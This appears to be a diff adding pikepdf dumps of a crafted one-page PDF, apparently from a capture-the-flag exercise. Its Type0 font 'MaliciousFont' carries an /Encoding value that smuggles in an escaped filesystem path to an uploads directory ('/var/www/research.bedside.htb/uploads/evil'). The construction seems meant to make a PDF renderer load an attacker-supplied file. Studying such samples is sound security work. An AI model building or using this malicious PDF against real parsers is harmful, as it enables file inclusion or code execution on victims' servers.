@@ -1,0 +1,116 @@
+pikepdf.Dictionary(Type="/Catalog")({
+  "/Pages": {
+    "/Count": 1,
+    "/Kids": [ <Pdf.pages.from_objgen(3,0)> ],
+    "/Type": "/Pages"
+  },
+  "/Type": "/Catalog"
+})
+pikepdf.Dictionary(Type="/Pages")({
+  "/Count": 1,
+  "/Kids": [ <Pdf.pages.from_objgen(3,0)> ],
+  "/Type": "/Pages"
+})
+<pikepdf.Dictionary(Type="/Page")({
+  "/Contents": pikepdf.Stream(owner=<...>, data=b'BT /F1 12 Tf 100 700'..., {
+    "/Filter": "/FlateDecode",
+    "/Length": 49
+  }),
+  "/MediaBox": [ 0, 0, 612, 792 ],
+  "/Parent": <reference to /Pages>,
+  "/Resources": {
+    "/Font": {
+      "/F1": {
+        "/BaseFont": "/MaliciousFont-Identity-H",
+        "/DescendantFonts": [ {
+          "/BaseFont": "/MaliciousFont",
+          "/CIDSystemInfo": {
+            "/Ordering": "Identity",
+            "/Registry": "Adobe",
+            "/Supplement": 0
+          },
+          "/FontDescriptor": {
+            "/Ascent": 1000,
+            "/CapHeight": 800,
+            "/Descent": -200,
+            "/Flags": 4,
+            "/FontBBox": [ -1000, -1000, 1000, 1000 ],
+            "/FontName": "/MaliciousFont",
+            "/ItalicAngle": 0,
+            "/StemV": 80,
+            "/Type": "/FontDescriptor"
+          },
+          "/Subtype": "/CIDFontType2",
+          "/Type": "/Font"
+        } ],
+        "/Encoding": "/var#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fevil",
+        "/Subtype": "/Type0",
+        "/Type": "/Font"
+      }
+    }
+  },
+  "/Type": "/Page"
+})>
+<pikepdf.Stream(owner=<...>, data=b'BT /F1 12 Tf 100 700'..., {
+  "/Filter": "/FlateDecode",
+  "/Length": 49
+})>
+pikepdf.Dictionary(Type="/Font")({
+  "/BaseFont": "/MaliciousFont-Identity-H",
+  "/DescendantFonts": [ {
+    "/BaseFont": "/MaliciousFont",
+    "/CIDSystemInfo": {
+      "/Ordering": "Identity",
+      "/Registry": "Adobe",
+      "/Supplement": 0
+    },
+    "/FontDescriptor": {
+      "/Ascent": 1000,
+      "/CapHeight": 800,
+      "/Descent": -200,
+      "/Flags": 4,
+      "/FontBBox": [ -1000, -1000, 1000, 1000 ],
+      "/FontName": "/MaliciousFont",
+      "/ItalicAngle": 0,
+      "/StemV": 80,
+      "/Type": "/FontDescriptor"
+    },
+    "/Subtype": "/CIDFontType2",
+    "/Type": "/Font"
+  } ],
+  "/Encoding": "/var#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fevil",
+  "/Subtype": "/Type0",
+  "/Type": "/Font"
+})
+pikepdf.Dictionary(Type="/Font")({
+  "/BaseFont": "/MaliciousFont",
+  "/CIDSystemInfo": {
+    "/Ordering": "Identity",
+    "/Registry": "Adobe",
+    "/Supplement": 0
+  },
+  "/FontDescriptor": {
+    "/Ascent": 1000,
+    "/CapHeight": 800,
+    "/Descent": -200,
+    "/Flags": 4,
+    "/FontBBox": [ -1000, -1000, 1000, 1000 ],
+    "/FontName": "/MaliciousFont",
+    "/ItalicAngle": 0,
+    "/StemV": 80,
+    "/Type": "/FontDescriptor"
+  },
+  "/Subtype": "/CIDFontType2",
+  "/Type": "/Font"
+})
+pikepdf.Dictionary(Type="/FontDescriptor")({
+  "/Ascent": 1000,
+  "/CapHeight": 800,
+  "/Descent": -200,
+  "/Flags": 4,
+  "/FontBBox": [ -1000, -1000, 1000, 1000 ],
+  "/FontName": "/MaliciousFont",
+  "/ItalicAngle": 0,
+  "/StemV": 80,
+  "/Type": "/FontDescriptor"
+})
